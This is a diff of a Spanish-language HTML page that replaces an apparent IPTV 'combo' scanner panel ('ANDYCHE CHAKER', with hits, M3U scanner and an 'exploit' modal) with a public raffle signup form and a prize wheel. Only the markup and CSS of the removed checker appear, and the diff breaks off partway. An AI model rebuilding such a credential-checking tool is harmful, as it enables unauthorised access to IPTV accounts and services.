@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<title>🦁 ANDYCHE CHAKER - IPTV SCANNER PRO</title>
+<title>🦁 ANDYCHE CHAKER - SORTEO</title>
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800;900&family=Plus+Jakarta+Sans:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
@@ -72,7 +72,10 @@
     justify-content: center;
     padding: 20px;
     background: radial-gradient(ellipse at center, var(--card-bg) 0%, var(--bg) 100%);
+    flex-direction: column;
+    gap: 20px;
   }
+
   .login-card {
     max-width: 420px;
     width: 100%;
@@ -132,40 +135,53 @@
   .login-card .btn-login:hover { transform: translateY(-2px); box-shadow: var(--shadow-glow); }
   .login-card .switch-auth { margin-top: 16px; font-size: 0.85rem; opacity: 0.7; cursor: pointer; color: var(--celeste-leon); }
   .login-card .switch-auth:hover { opacity: 1; }
-  .login-card .forgot-pass { margin-top: 10px; font-size: 0.8rem; opacity: 0.5; cursor: pointer; color: var(--celeste-leon); }
-  .login-card .forgot-pass:hover { opacity: 1; }
 
-  /* Mensaje de aprobación */
-  .approval-message {
-    margin-top: 14px;
-    padding: 12px 16px;
-    border-radius: 12px;
-    font-weight: 700;
-    font-size: 0.95rem;
-    display: none;
-    animation: fadeInUp 0.5s ease;
+  /* ===== BOTÓN REGISTRO SORTEO (PÚBLICO) ===== */
+  .btn-sorteo-publico {
+    max-width: 420px;
+    width: 100%;
+    padding: 20px 30px;
+    border-radius: 32px;
+    border: 3px solid transparent;
+    background-image: linear-gradient(var(--card-bg), var(--card-bg)), var(--gradient);
+    background-origin: padding-box, border-box;
+    background-clip: padding-box, border-box;
+    box-shadow: var(--shadow-glow);
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    font-family: 'Orbitron', monospace;
+    font-weight: 900;
+    font-size: 1.3rem;
+    color: #fff;
+    text-shadow: 0 0 20px rgba(220, 38, 38, 0.5);
+    animation: pulse 2s infinite;
   }
-  .approval-message.show { display: block; }
-  .approval-message.success {
-    background: rgba(22, 163, 74, 0.2);
-    border: 2px solid var(--verde-leon);
-    color: var(--verde-leon-claro);
+  .btn-sorteo-publico:hover {
+    transform: scale(1.02);
+    box-shadow: 0 0 50px rgba(220, 38, 38, 0.4);
   }
-  .approval-message.waiting {
-    background: rgba(234, 179, 8, 0.2);
-    border: 2px solid #eab308;
-    color: #eab308;
-  }
-  .approval-message.blocked {
-    background: rgba(220, 38, 38, 0.2);
-    border: 2px solid var(--rojo-leon);
-    color: var(--rojo-leon-claro);
+  .btn-sorteo-publico .icono-grande { font-size: 3rem; display: block; margin-bottom: 5px; }
+  .btn-sorteo-publico .subtitulo { font-size: 0.7rem; font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 400; opacity: 0.7; }
+
+  @keyframes pulse {
+    0% { box-shadow: 0 0 20px rgba(220, 38, 38, 0.3), 0 0 40px rgba(14, 165, 233, 0.1); }
+    50% { box-shadow: 0 0 40px rgba(220, 38, 38, 0.6), 0 0 80px rgba(14, 165, 233, 0.2); }
+    100% { box-shadow: 0 0 20px rgba(220, 38, 38, 0.3), 0 0 40px rgba(14, 165, 233, 0.1); }
   }
 
-  @keyframes fadeInUp {
-    from { opacity: 0; transform: translateY(15px); }
-    to { opacity: 1; transform: translateY(0); }
+  .texto-administrador {
+    max-width: 420px;
+    width: 100%;
+    text-align: center;
+    font-size: 0.8rem;
+    opacity: 0.4;
+    margin-top: 10px;
+    cursor: pointer;
+    transition: all 0.3s;
+    padding: 8px;
   }
+  .texto-administrador:hover { opacity: 0.8; }
 
   /* Toast */
   .toast {
@@ -202,7 +218,7 @@
     to { transform: translateY(0); opacity: 1; }
   }
 
-  /* ===== SIDEBAR ===== */
+  /* ===== SIDEBAR (ADMIN) ===== */
   .sidebar {
     width: 100%;
     background: rgba(10, 14, 26, 0.9);
@@ -311,130 +327,6 @@
 
   .flex-btns { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 10px; }
 
-  .table-container { width: 100%; overflow-x: auto; border-radius: 20px; background: var(--card-bg); margin-top: 12px; border: 1px solid var(--border); }
-  table { width: 100%; border-collapse: collapse; font-size: 13px; min-width: 500px; }
-  th { background: var(--table-header); color: var(--celeste-leon); padding: 12px 12px; text-align: left; font-weight: 800; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
-  td { padding: 10px 12px; border-bottom: 1px solid var(--border); }
-  tr:hover td { background: rgba(220, 38, 38, 0.05); }
-
-  /* ===== SCANNER ===== */
-  .scan-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
-    gap: 14px;
-    margin-top: 12px;
-  }
-  .scan-card {
-    background: var(--card-bg);
-    border-radius: 20px;
-    padding: 18px;
-    border: 1px solid var(--border);
-    transition: all 0.3s;
-    cursor: pointer;
-    text-align: center;
-  }
-  .scan-card:hover { border-color: var(--rojo-leon); transform: translateY(-4px); box-shadow: var(--shadow-glow); }
-  .scan-card .scan-icon { font-size: 2.2rem; margin-bottom: 8px; }
-  .scan-card .scan-name { font-weight: 700; font-size: 1rem; color: var(--celeste-leon); }
-  .scan-card .scan-desc { font-size: 0.8rem; opacity: 0.6; margin-top: 4px; }
-
-  /* ===== PROGRESS (MUNRRA STYLE) ===== */
-  #progressContainer, #progressContainer2, #progressContainer3 {
-    margin-top: 16px;
-    max-width: 100%;
-    border: 2px solid transparent;
-    border-radius: 10px;
-    padding: 10px;
-    box-shadow: var(--shadow-glow);
-  }
-  #progressBar { background: var(--input-bg); border-radius: 10px; height: 18px; overflow: hidden; }
-  #progressBarFill, #progressBarFill2, #progressBarFill3 { background: var(--gradient); height: 100%; width: 0%; transition: width .3s ease; }
-  #progressText, #progressText2, #progressText3 { margin-top: 4px; font-size: 13px; background: var(--gradient); -webkit-background-clip: text; background-clip: text; color: transparent; }
-  #currentCombo, #currentCombo2, #currentCombo3 { margin-top: 4px; font-size: 12px; background: var(--gradient); -webkit-background-clip: text; background-clip: text; color: transparent; min-height: 20px; line-height: 20px; overflow: hidden; text-overflow: ellipsis; }
-
-  .yellow-hit { color: #fbbf24; text-shadow: 0 0 8px #fbbf24, 0 0 15px #fbbf24; font-weight: 700; }
-
-  /* ===== HITS ===== */
-  #hitsContainer {
-    margin-top: 12px;
-    max-width: 100%;
-    flex-grow: 1;
-    overflow-y: auto;
-    background: var(--input-bg);
-    padding: 15px;
-    border-radius: 15px;
-    font-size: 14px;
-    box-shadow: var(--shadow-glow);
-    color: var(--text);
-    max-height: 500px;
-  }
-  .hit-block {
-    border: 2px solid transparent;
-    padding: 12px;
-    margin-bottom: 10px;
-    border-radius: 12px;
-    background: #000;
-    transition: background .3s, box-shadow .3s;
-    box-shadow: var(--shadow-glow);
-    position: relative;
-    overflow: hidden;
-  }
-  .hit-block:hover { background: #1a1025; }
-  .hit-block .hit-header { font-weight: bold; margin-bottom: 6px; background: var(--gradient); -webkit-background-clip: text; background-clip: text; color: transparent; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
-  .hit-block .hit-content { white-space: pre-wrap; color: #cfe9ff; text-shadow: 0 0 4px rgba(14, 165, 233, 0.5); font-size: 12px; max-height: 150px; overflow-y: auto; }
-  .hit-block .hit-actions { display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap; }
-  .hit-block .hit-actions button { width: auto; padding: 4px 12px; font-size: 11px; margin: 0; }
-  .hit-counter { font-size: 12px; opacity: 0.7; background: var(--input-bg); padding: 2px 10px; border-radius: 20px; }
-
-  .lang-row { display: flex; justify-content: flex-end; align-items: center; margin-top: 6px; margin-bottom: 12px; }
-  .lang-pill {
-    background: #000;
-    border: 2px solid transparent;
-    background: var(--gradient);
-    color: #fff;
-    border-radius: 9999px;
-    padding: 6px 28px 6px 14px;
-    font-family: 'Orbitron', monospace;
-    font-size: 0.9rem;
-    box-shadow: var(--shadow-glow);
-    outline: none;
-    appearance: none;
-    cursor: pointer;
-  }
-
-  .cors-row { display: flex; align-items: center; gap: 8px; margin-top: 8px; }
-  .opts { display: flex; flex-direction: column; gap: 4px; margin: 6px 0 2px; }
-  .jobTop { display: flex; align-items: center; justify-content: flex-start; margin-bottom: 6px; }
-  .hitsCount { font-weight: 700; background: var(--gradient); -webkit-background-clip: text; background-clip: text; color: transparent; font-size: 0.9rem; }
-
-  input[type="file"] { position: relative; overflow: hidden; border-radius: 10px; }
-  input[type="file"]::before {
-    content: "";
-    position: absolute;
-    top: 0; right: -75%;
-    width: 50%;
-    height: 100%;
-    background: linear-gradient(120deg, transparent, rgba(255,255,255,0.4), transparent);
-    transform: skewX(-20deg);
-    animation: shineMove 6s infinite;
-  }
-  @keyframes shineMove { 0% { right: -75%; } 50% { right: 125%; } 100% { right: -75%; } }
-
-  .hit-block::before {
-    content: "";
-    position: absolute;
-    bottom: -75%;
-    right: -75%;
-    width: 80%;
-    height: 80%;
-    background: linear-gradient(135deg, transparent, rgba(255,255,255,0.3), transparent);
-    transform: skewX(-20deg);
-    animation: shineDiagonal 6s ease-in-out infinite;
-    pointer-events: none;
-  }
-  @keyframes shineDiagonal { 0% { bottom: -75%; right: -75%; opacity: 0; } 10% { opacity: 1; } 50% { bottom: 125%; right: 125%; opacity: 1; } 60% { opacity: 0; } 100% { bottom: 125%; right: 125%; opacity: 0; } }
-
-  /* ===== DASHBOARD ===== */
   .dashboard-grid {
     display: grid;
     grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
@@ -453,161 +345,6 @@
   .stat-card .stat-number { font-size: 1.8rem; font-weight: 900; background: var(--gradient); -webkit-background-clip: text; background-clip: text; color: transparent; }
   .stat-card .stat-label { font-size: 0.75rem; opacity: 0.6; margin-top: 4px; }
   .stat-card .stat-icon { font-size: 1.6rem; }
-
-  /* ===== CLIENTES ===== */
-  .clientes-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-    gap: 16px;
-    margin-top: 12px;
-  }
-  .cliente-card {
-    background: var(--card-bg);
-    border-radius: 20px;
-    padding: 18px;
-    border: 1px solid var(--border);
-    transition: all 0.3s;
-    position: relative;
-    overflow: hidden;
-  }
-  .cliente-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: var(--gradient); }
-  .cliente-card:hover { transform: translateY(-4px); border-color: var(--celeste-leon); box-shadow: var(--shadow-glow); }
-  .cliente-card .cliente-header { display: flex; justify-content: space-between; align-items: start; margin-bottom: 8px; }
-  .cliente-card .cliente-nombre { font-size: 1.1rem; font-weight: 800; }
-  .cliente-card .cliente-telefono { font-size: 0.85rem; opacity: 0.7; }
-  .cliente-card .cliente-detalle { font-size: 0.8rem; padding: 4px 0; display: flex; justify-content: space-between; border-bottom: 1px solid var(--border); }
-  .cliente-card .cliente-detalle .label { opacity: 0.6; font-weight: 600; }
-  .cliente-card .cliente-detalle .valor { font-weight: 700; text-align: right; }
-  .cliente-card .cliente-detalle .valor.azul { color: var(--celeste-leon); }
-  .cliente-card .cliente-detalle .valor.rosa { color: var(--rojo-leon); }
-  .cliente-card .cliente-detalle .valor.verde { color: var(--verde-leon); }
-  .cliente-card .cliente-detalle .valor.rojo { color: var(--rojo-leon); }
-  .cliente-card .cliente-detalle .valor.naranja { color: #f59e0b; }
-
-  .cliente-card .progreso-container { margin: 10px 0; }
-  .cliente-card .progreso-bar { background: var(--progress-bg); border-radius: 20px; height: 6px; width: 100%; overflow: hidden; }
-  .cliente-card .progreso-fill { height: 100%; border-radius: 20px; width: 0%; transition: width 0.6s ease; background: var(--gradient); }
-  .cliente-card .progreso-texto { display: flex; justify-content: space-between; font-size: 11px; margin-top: 4px; opacity: 0.7; }
-  .cliente-card .acciones { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 10px; }
-
-  /* ===== PANEL EDITAR CLIENTE ===== */
-  .panel-overlay {
-    display: none;
-    position: fixed;
-    top: 0; left: 0; right: 0; bottom: 0;
-    background: rgba(0,0,0,0.8);
-    backdrop-filter: blur(8px);
-    z-index: 999;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-  }
-  .panel-overlay.active { display: flex; }
-  .panel-editar {
-    background: var(--card-bg);
-    border-radius: 24px;
-    padding: 30px;
-    max-width: 500px;
-    width: 100%;
-    max-height: 90vh;
-    overflow-y: auto;
-    border: 2px solid var(--rojo-leon);
-    box-shadow: var(--shadow-glow);
-    position: relative;
-  }
-  .panel-editar .panel-titulo { font-size: 1.4rem; font-weight: 800; margin-bottom: 16px; background: var(--gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-  .panel-editar .panel-campo { margin-bottom: 10px; }
-  .panel-editar .panel-campo label { display: block; font-size: 12px; font-weight: 600; opacity: 0.7; margin-bottom: 4px; }
-  .panel-editar .panel-campo input, .panel-editar .panel-campo select, .panel-editar .panel-campo textarea { margin-top: 0; width: 100%; padding: 10px 14px; border-radius: 12px; }
-  .panel-editar .panel-botones { display: flex; gap: 10px; margin-top: 14px; }
-  .panel-editar .panel-botones button { flex: 1; padding: 12px; }
-  .panel-editar .panel-cerrar { position: absolute; top: 15px; right: 20px; background: none; border: none; color: var(--text); font-size: 24px; cursor: pointer; padding: 0; width: auto; opacity: 0.6; }
-  .panel-editar .panel-cerrar:hover { opacity: 1; transform: scale(1.1); }
-
-  .user-pending { border-left: 4px solid var(--rojo-leon); background: rgba(220, 38, 38, 0.05); }
-  .user-approved { border-left: 4px solid var(--verde-leon); }
-  .user-blocked { border-left: 4px solid #666; background: rgba(100, 100, 100, 0.05); opacity: 0.7; }
-
-  /* ===== MODAL ===== */
-  .modal-overlay {
-    display: none;
-    position: fixed;
-    top: 0; left: 0; right: 0; bottom: 0;
-    background: rgba(0,0,0,0.85);
-    backdrop-filter: blur(6px);
-    z-index: 1000;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-  }
-  .modal-overlay.active { display: flex; }
-  .modal-content {
-    background: var(--card-bg);
-    border-radius: 24px;
-    padding: 30px;
-    max-width: 550px;
-    width: 100%;
-    max-height: 85vh;
-    overflow-y: auto;
-    border: 2px solid var(--celeste-leon);
-    box-shadow: var(--shadow-glow);
-  }
-  .modal-content .modal-title { font-size: 1.3rem; font-weight: 800; margin-bottom: 14px; background: var(--gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-  .modal-content .modal-close {
-    float: right;
-    background: none;
-    border: none;
-    color: var(--text);
-    font-size: 24px;
-    cursor: pointer;
-    width: auto;
-    padding: 0 8px;
-  }
-  .modal-content .modal-close:hover { opacity: 0.7; }
-  .modal-content .result-box {
-    background: var(--input-bg);
-    border-radius: 12px;
-    padding: 12px;
-    margin-top: 10px;
-    max-height: 300px;
-    overflow-y: auto;
-    font-family: monospace;
-    font-size: 12px;
-    white-space: pre-wrap;
-    border: 1px solid var(--border);
-    line-height: 1.6;
-  }
-  .modal-content .result-box .found { color: var(--verde-leon-claro); font-weight: bold; }
-  .modal-content .result-box .error { color: var(--rojo-leon-claro); }
-  .modal-content .result-box .info { color: var(--celeste-leon-claro); }
-
-  /* ===== URL ITEMS ===== */
-  .url-item {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    padding: 10px 14px;
-    border-bottom: 1px solid var(--border);
-    flex-wrap: wrap;
-  }
-  .url-item:hover { background: rgba(14, 165, 233, 0.05); }
-  .url-item .url-text {
-    flex: 1;
-    font-size: 13px;
-    word-break: break-all;
-    min-width: 150px;
-  }
-  .url-item .url-text .url-link {
-    color: var(--celeste-leon);
-    text-decoration: none;
-  }
-  .url-item .url-text .url-link:hover { text-decoration: underline; }
-  .url-item .url-actions {
-    display: flex;
-    gap: 6px;
-    flex-wrap: wrap;
-  }
-  .url-item .url-actions button { width: auto; padding: 4px 10px; font-size: 10px; margin: 0; }
 
   /* ===== RUEDA DE SORTEO ===== */
   .rueda-container {
@@ -695,6 +432,7 @@
     text-shadow: 0 0 20px rgba(220, 38, 38, 0.8);
     filter: drop-shadow(0 0 10px rgba(220, 38, 38, 0.5));
   }
+
   .participantes-lista {
     display: flex;
     flex-wrap: wrap;
@@ -718,10 +456,68 @@
     animation: fadeIn 0.3s ease;
   }
 
+  /* ===== MODAL ===== */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(6px);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .modal-overlay.active { display: flex; }
+  .modal-content {
+    background: var(--card-bg);
+    border-radius: 24px;
+    padding: 30px;
+    max-width: 550px;
+    width: 100%;
+    max-height: 85vh;
+    overflow-y: auto;
+    border: 2px solid var(--celeste-leon);
+    box-shadow: var(--shadow-glow);
+  }
+  .modal-content .modal-title { font-size: 1.3rem; font-weight: 800; margin-bottom: 14px; background: var(--gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+  .modal-content .modal-close {
+    float: right;
+    background: none;
+    border: none;
+    color: var(--text);
+    font-size: 24px;
+    cursor: pointer;
+    width: auto;
+    padding: 0 8px;
+  }
+  .modal-content .modal-close:hover { opacity: 0.7; }
+
+  .registro-exitoso {
+    text-align: center;
+    padding: 20px;
+  }
+  .registro-exitoso .icono { font-size: 4rem; margin-bottom: 10px; }
+  .registro-exitoso .mensaje { font-size: 1.2rem; font-weight: 700; color: var(--verde-leon-claro); }
+  .registro-exitoso .subtitulo { opacity: 0.7; margin-top: 8px; }
+
+  /* ===== GANADOR MODAL ===== */
+  .ganador-content {
+    text-align: center;
+    padding: 20px 0;
+  }
+  .ganador-content .trofeo { font-size: 4rem; margin-bottom: 10px; animation: bounce 1s infinite; }
+  @keyframes bounce {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-15px); }
+  }
+  .ganador-content .nombre { font-size: 2.2rem; font-weight: 900; color: #fbbf24; text-shadow: 0 0 30px rgba(251, 191, 36, 0.3); }
+  .ganador-content .detalle { font-size: 1rem; opacity: 0.7; margin-top: 8px; }
+
   @media (max-width: 768px) {
-    .clientes-grid { grid-template-columns: 1fr; }
-    .scan-grid { grid-template-columns: 1fr 1fr; }
-    .dashboard-grid { grid-template-columns: 1fr 1fr; }
+    .rueda-wrapper { width: 220px; height: 220px; }
+    .rueda .segmento span { font-size: 7px; max-width: 40px; }
+    .rueda .center-circle { width: 40px; height: 40px; font-size: 16px; }
     .sidebar { gap: 6px; padding: 8px 12px; }
     .nav-btn { font-size: 10px; padding: 6px 10px; }
     .logo-area { font-size: 0.7rem; padding: 4px 10px; }
@@ -729,24 +525,34 @@
     .card { padding: 14px; }
     .login-card { padding: 30px 20px; }
     .modal-content { padding: 20px; }
-    .url-item { flex-direction: column; align-items: stretch; }
-    .url-item .url-actions { justify-content: center; }
     .toast { bottom: 15px; right: 15px; left: 15px; max-width: none; }
-    .rueda-wrapper { width: 220px; height: 220px; }
-    .rueda .segmento span { font-size: 7px; max-width: 40px; }
-    .rueda .center-circle { width: 40px; height: 40px; font-size: 16px; }
+    .btn-sorteo-publico { font-size: 1rem; padding: 16px 20px; }
+    .btn-sorteo-publico .icono-grande { font-size: 2rem; }
   }
-  @media (max-width: 480px) { .scan-grid { grid-template-columns: 1fr; } .dashboard-grid { grid-template-columns: 1fr; } }
 </style>
 </head>
 <body>
 
-<!-- ===== LOGIN / REGISTRO ===== -->
+<!-- ===== PÁGINA DE INICIO ===== -->
 <div id="loginContainer" class="login-container">
-  <div class="login-card" id="loginCard">
+  
+  <!-- BOTÓN PÚBLICO PARA REGISTRARSE EN EL SORTEO -->
+  <div class="btn-sorteo-publico" onclick="abrirModalRegistroSorteo()">
+    <span class="icono-grande">🎯</span>
+    REGÍSTRATE PARA EL SORTEO
+    <div class="subtitulo">🦁 Sorteo del Loco Andy - ¡Participa y gana!</div>
+  </div>
+
+  <!-- TEXTO "SOY ADMINISTRADOR" para mostrar el login -->
+  <div class="texto-administrador" onclick="toggleLogin()">
+    👑 Soy Administrador
+  </div>
+
+  <!-- FORMULARIO DE LOGIN (oculto por defecto) -->
+  <div class="login-card" id="loginCard" style="display:none;">
     <div class="logo-grande">🦁</div>
     <h1>ANDYCHE CHAKER</h1>
-    <p>IPTV Scanner Pro V7.9.1</p>
+    <p>Panel de Administración</p>
 
     <div id="loginForm">
       <input id="loginEmail" type="email" placeholder="Correo electrónico">
@@ -755,67 +561,25 @@
         <button class="toggle-pass" onclick="togglePasswordVisibility('loginPass', this)">👁️</button>
       </div>
       <button class="btn-login" onclick="handleLogin()">🔐 INICIAR SESIÓN</button>
-      <p class="forgot-pass" onclick="mostrarRecuperarPass()">¿Olvidaste tu contraseña?</p>
-      <p class="switch-auth" onclick="toggleAuthMode('register')">¿No tienes cuenta? <strong>Regístrate</strong></p>
-      
-      <!-- Mensaje de aprobación en tiempo real -->
-      <div id="approvalMessage" class="approval-message waiting">
-        ⏳ Tu cuenta está pendiente de aprobación. Espera a que el admin te apruebe.
-      </div>
+      <div id="loginMessage" style="margin-top:12px; font-size:0.9rem;"></div>
     </div>
-
-    <div id="registerForm" style="display:none;">
-      <input id="registerEmail" type="email" placeholder="Correo electrónico">
-      <div class="input-group">
-        <input id="registerPass" type="password" placeholder="Contraseña (mínimo 6 caracteres)">
-        <button class="toggle-pass" onclick="togglePasswordVisibility('registerPass', this)">👁️</button>
-      </div>
-      <input id="registerName" placeholder="Tu nombre completo">
-      <button class="btn-login" onclick="handleRegister()">📝 REGISTRARSE</button>
-      <p class="switch-auth" onclick="toggleAuthMode('login')">¿Ya tienes cuenta? <strong>Inicia sesión</strong></p>
-      <p style="font-size:0.8rem; opacity:0.5; margin-top:12px;">⚠️ El admin debe aprobar tu cuenta para acceder.</p>
-    </div>
-
-    <div id="forgotForm" style="display:none;">
-      <p style="font-size:0.9rem; opacity:0.7; margin-bottom:10px;">Ingresa tu correo para recibir un código de recuperación.</p>
-      <input id="forgotEmail" type="email" placeholder="Correo electrónico">
-      <div id="forgotCodeSection" style="display:none;">
-        <input id="forgotCode" type="text" placeholder="Código de verificación">
-        <input id="forgotNewPass" type="password" placeholder="Nueva contraseña">
-        <div class="input-group">
-          <input id="forgotNewPassConfirm" type="password" placeholder="Confirmar nueva contraseña">
-          <button class="toggle-pass" onclick="togglePasswordVisibility('forgotNewPassConfirm', this)">👁️</button>
-        </div>
-      </div>
-      <button class="btn-login" onclick="enviarCodigoRecuperacion()" id="btnEnviarCodigo">📧 Enviar código</button>
-      <button class="btn-login" onclick="verificarCodigoRecuperacion()" id="btnVerificarCodigo" style="display:none;">✅ Verificar y cambiar</button>
-      <p class="switch-auth" onclick="toggleAuthMode('login')">← Volver al inicio</p>
-      <div id="forgotMessage" style="margin-top:10px; font-size:0.9rem;"></div>
-    </div>
-
-    <div id="loginMessage" style="margin-top:12px; font-size:0.9rem;"></div>
   </div>
 </div>
 
 <!-- ===== TOAST ===== -->
 <div class="toast" id="toastNotification">
   <button class="toast-close" onclick="cerrarToast()">✕</button>
-  <div class="toast-title" id="toastTitle">✅ ¡Cuenta Aprobada!</div>
-  <div class="toast-body" id="toastBody">El admin ha aprobado tu cuenta. ¡Ya puedes acceder!</div>
+  <div class="toast-title" id="toastTitle">✅ ¡Registro exitoso!</div>
+  <div class="toast-body" id="toastBody">Estás participando en el sorteo del Loco Andy 🦁</div>
 </div>
 
-<!-- ===== APP ===== -->
+<!-- ===== APP (ADMIN) ===== -->
 <div id="appContainer" style="display:none;">
 
   <div class="sidebar">
     <div class="logo-area"><span class="icono">🦁</span><strong>ANDYCHE</strong></div>
     <button class="nav-btn active" data-page="p-dashboard">📊 Dashboard</button>
-    <button class="nav-btn" data-page="p-scanner">📡 Scanner</button>
-    <button class="nav-btn" data-page="p-hits">💾 Hits</button>
-    <button class="nav-btn" id="btnClientes" data-page="p-clientes" style="display:none;">👥 Clientes</button>
-    <button class="nav-btn" data-page="p-urls">🔗 URLs</button>
-    <button class="nav-btn" id="btnAdminUsers" data-page="p-admin-users" style="display:none;">👑 Usuarios</button>
-    <button class="nav-btn" data-page="p-settings">⚙️</button>
+    <button class="nav-btn" data-page="p-participantes">🎯 Participantes</button>
     <button onclick="handleLogout()" style="background:var(--gradient-fire); color:#fff; padding:6px 14px; border-radius:40px; border:none; cursor:pointer; font-weight:700; font-size:11px; white-space:nowrap; margin-left:auto;">🚪 Salir</button>
   </div>
 
@@ -824,362 +588,131 @@
     <!-- ===== DASHBOARD ===== -->
     <div id="p-dashboard" class="page active">
       <div class="card">
-        <div class="card-title">📊 Panel de Control</div>
+        <div class="card-title">📊 Panel de Control - Sorteo del Loco Andy</div>
         <div class="dashboard-grid" id="dashboard-stats">
-          <div class="stat-card"><div class="stat-icon">🎯</div><div class="stat-number" id="total-hits">0</div><div class="stat-label">Total Hits</div></div>
-          <div class="stat-card"><div class="stat-icon">👥</div><div class="stat-number" id="total-clientes">0</div><div class="stat-label">Total Clientes</div></div>
-          <div class="stat-card"><div class="stat-icon">🔗</div><div class="stat-number" id="total-urls">0</div><div class="stat-label">URLs Guardadas</div></div>
+          <div class="stat-card"><div class="stat-icon">👥</div><div class="stat-number" id="total-participantes">0</div><div class="stat-label">Total Participantes</div></div>
           <div class="stat-card"><div class="stat-icon">🦁</div><div class="stat-number" id="status-online">✅</div><div class="stat-label">Estado</div></div>
         </div>
       </div>
       
-      <!-- ===== RUEDA DE SORTEO - PARA TODOS ===== -->
+      <!-- ===== RUEDA DE SORTEO ===== -->
       <div class="card">
-        <div class="card-title">🎯 Sorteo del Loco Andy</div>
-        <p class="card-subtitle">¡Participa y gana premios increíbles!</p>
+        <div class="card-title">🎯 Ruleta del Sorteo</div>
+        <p class="card-subtitle">¡Gira la ruleta y elige al ganador!</p>
         
-        <!-- Botón para anotarse (visible para todos) -->
-        <button onclick="abrirModalRegistroSorteo()" class="btn-rosa" style="margin-bottom: 15px; font-weight: 800; font-size: 1.1rem;">
-          🎯 ANOTARME PARA EL SORTEO
-        </button>
-        
-        <!-- Rueda de sorteo -->
         <div class="rueda-container">
           <div class="rueda-wrapper">
             <div class="flecha">▼</div>
             <div class="rueda" id="ruedaSorteo">
-              <!-- Los segmentos se generan con JavaScript -->
+              <div style="display: flex; align-items: center; justify-content: center; height: 100%; width: 100%; font-size: 1rem; opacity: 0.5; text-align: center; padding: 20px; border-radius: 50%;">
+                Sin participantes<br>¡Espera inscripciones!
+              </div>
             </div>
             <div class="center-circle">🎯</div>
           </div>
         </div>
         
-        <!-- Botones de control de la rueda -->
         <div class="flex-btns" style="justify-content: center; margin-top: 10px;">
           <button onclick="girarRuleta()" id="btnGirarRuleta" style="background: var(--gradient); font-size: 1.1rem; font-weight: 800; padding: 12px 30px; width: auto;">
             🎰 GIRAR RULETA
           </button>
         </div>
         
-        <!-- Participantes inscritos -->
         <div style="margin-top: 15px;">
           <div style="display: flex; justify-content: space-between; align-items: center;">
-            <span style="font-weight: 700; font-size: 0.9rem;">👥 Participantes inscritos: <span id="totalParticipantes">0</span></span>
-          </div>
-          <div class="participantes-lista" id="listaParticipantes">
-            <p style="opacity: 0.5; font-size: 0.8rem; width: 100%; text-align: center;">No hay participantes aún.</p>
-          </div>
-        </div>
-        
-        <!-- Panel de Administración del Sorteo (SOLO ADMIN) -->
-        <div id="adminSorteoPanel" style="display: none; margin-top: 20px; padding-top: 20px; border-top: 2px solid var(--border);">
-          <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
-            <span style="font-weight: 700; font-size: 1rem; color: var(--rojo-leon);">👑 Gestión del Sorteo (Admin)</span>
+            <span style="font-weight: 700; font-size: 0.9rem;">👥 Participantes inscritos: <span id="totalParticipantesDash">0</span></span>
             <div style="display: flex; gap: 8px; flex-wrap: wrap;">
               <button onclick="cargarParticipantesEnRuleta()" class="btn-success" style="font-size: 0.8rem; padding: 8px 16px; width: auto;">
-                🎯 CARGAR EN LA RULETA
+                🎯 CARGAR EN RULETA
               </button>
               <button onclick="eliminarTodosParticipantes()" class="btn-danger" style="font-size: 0.8rem; padding: 8px 16px; width: auto;">
                 🗑️ ELIMINAR TODOS
               </button>
             </div>
           </div>
-          <div style="margin-top: 10px;">
-            <p style="font-size: 0.8rem; opacity: 0.6;">📋 Total de participantes registrados: <strong id="totalParticipantesAdmin">0</strong></p>
-          </div>
-          <div id="listaParticipantesAdmin" style="max-height: 200px; overflow-y: auto; margin-top: 10px; background: var(--input-bg); border-radius: 12px; padding: 10px; border: 1px solid var(--border);">
-            <p style="opacity: 0.5; font-size: 0.8rem;">No hay participantes registrados.</p>
+          <div class="participantes-lista" id="listaParticipantesDash">
+            <p style="opacity: 0.5; font-size: 0.8rem; width: 100%; text-align: center;">No hay participantes aún.</p>
           </div>
         </div>
-      </div>
-      
-      <div class="card">
-        <div class="card-title">📈 Últimos Hits</div>
-        <div id="ultimos-hits" style="max-height:300px; overflow-y:auto;"><p style="opacity:0.6;">No hay hits aún. Ejecuta un escaneo.</p></div>
       </div>
     </div>
 
-    <!-- ===== SCANNER ===== -->
-    <div id="p-scanner" class="page">
+    <!-- ===== PARTICIPANTES ===== -->
+    <div id="p-participantes" class="page">
       <div class="card">
-        <div class="card-title">📡 IPTV SCANNER V7.9.1</div>
-        <p class="card-subtitle">🦁 ANDYCHE CHAKER EDITION</p>
-
-        <div class="scan-grid">
-          <div class="scan-card" onclick="document.getElementById('scanner-panel').scrollIntoView({behavior:'smooth'});">
-            <div class="scan-icon">📡</div>
-            <div class="scan-name">M3U Scanner</div>
-            <div class="scan-desc">Multi-Servidor/Combo</div>
-          </div>
-          <div class="scan-card" onclick="abrirModal('exploit')">
